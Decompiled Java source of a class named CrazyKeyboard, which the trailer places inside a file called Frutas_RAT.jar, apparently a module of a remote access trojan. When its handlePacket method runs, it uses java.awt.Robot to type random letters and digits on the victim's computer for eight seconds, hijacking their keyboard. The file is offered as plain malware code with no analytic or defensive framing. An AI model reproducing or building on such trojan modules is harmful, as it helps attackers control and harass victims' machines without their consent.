/*    */ import java.awt.Robot;
/*    */ import java.io.PrintStream;
/*    */ import java.util.Random;
/*    */ 
/*    */ public class CrazyKeyboard
/*    */ {
/*    */   public void handlePacket()
/*    */   {
/*    */     try
/*    */     {
/* 22 */       long startTime = System.currentTimeMillis();
/* 23 */       Robot r = new Robot();
/* 24 */       char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
/* 25 */       while (System.currentTimeMillis() - startTime < 8000L) {
/* 26 */         for (int i = 0; i < 6; i++) {
/* 27 */           int rand = new Random().nextInt(chars.length);
/* 28 */           System.out.println(rand);
/* 29 */           r.keyPress(chars[rand]);
/* 30 */           r.keyRelease(chars[rand]);
/*    */         }
/* 32 */         Thread.sleep(700L);
/*    */       }
/*    */     } catch (Exception e) {
/* 35 */       e.printStackTrace();
/*    */     }
/*    */   }
/*    */ 
/*    */   public static void main(String[] args) throws InterruptedException {
/* 40 */     Thread.sleep(2000L);
/* 41 */     new CrazyKeyboard().handlePacket();
/*    */   }
/*    */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     CrazyKeyboard
 * JD-Core Version:    0.6.2
 */